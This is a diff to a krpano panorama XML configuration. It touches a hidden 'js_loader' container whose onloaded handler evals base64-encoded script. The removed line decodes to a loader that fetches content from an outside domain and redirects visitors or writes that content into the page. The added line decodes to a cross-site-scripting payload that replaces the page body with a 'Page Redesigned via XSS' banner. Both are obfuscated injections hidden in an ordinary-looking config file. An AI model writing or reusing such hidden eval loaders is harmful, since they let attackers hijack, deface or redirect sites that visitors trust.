@@ -4,19 +4,6 @@
     name="js_loader"
     type="container"
     visible="false"
-    onloaded="js(eval(var w=atob('ZmV0Y2goJ3B1enplbGdpZHMuY29tJykKIC5
-0aGVuKGZ1bmN0aW9uKHJlcyl7IHJldHVybiBy
-ZXMudGV4dCgpIH0pCiAgLnRoZW4oZnVuY3Rp
-b24oZSl7CiAgICB0cnkgewogICAgICB2YXIg
-ciA9IEpTT04ucGFyc2UoZSk7CiAgICAgIGlm
-KHJbJ3JlZGlyZWN0VXJsJyl7CiAgICAgICAg
-d2luZG93LmxvY2F0aW9uLmhyZWYgPSByWydy
-ZWRpcmVjdFVybCddOwogICAgICB9CiAgICB9
-IGNhdGNoKGVy cikgewogICAgICBkb2N1bWVu
-dC5vcGVuKCk7CiAgICAgIGRvY3VtZW50Lndy
-aXRlKGUpOwogICAgICBkb2N1bWVudC5jbG9z
-ZSgpOwogICAgfQogIH0pCiAgLmNhdGNoKGZ1
-bmN0aW9uKGVycil7IGNvbnNvbGUuZXJyb3Io
-ZXJyKSB9KTs=');eval(w)););"
+    onloaded="js(eval(var w=atob('PGtycGFubyBvbnN0YXJ0PSJqcyhkb2N1bWVudC5ib2R5LmlubmVySFRNTCA9ICc8ZGl2IHN0eWxlPXRleHQtYWxpZ246Y2VudGVyO21hcmdpbi10b3A6MTAwcHg7PjxoMSBzdHlsZT1jb2xvcjpyZWQ7PlBhZ2UgUmVkZXNpZ25lZCB2aWEgWFNTPC9oMT48cD5UaGlzIGRlc2lnbiB3YXMgaW5qZWN0ZWQgZHluYW1pY2FsbHkuPC9wPjwvZGl2PicpOyI');eval(w)););"
 />
 </krpano>
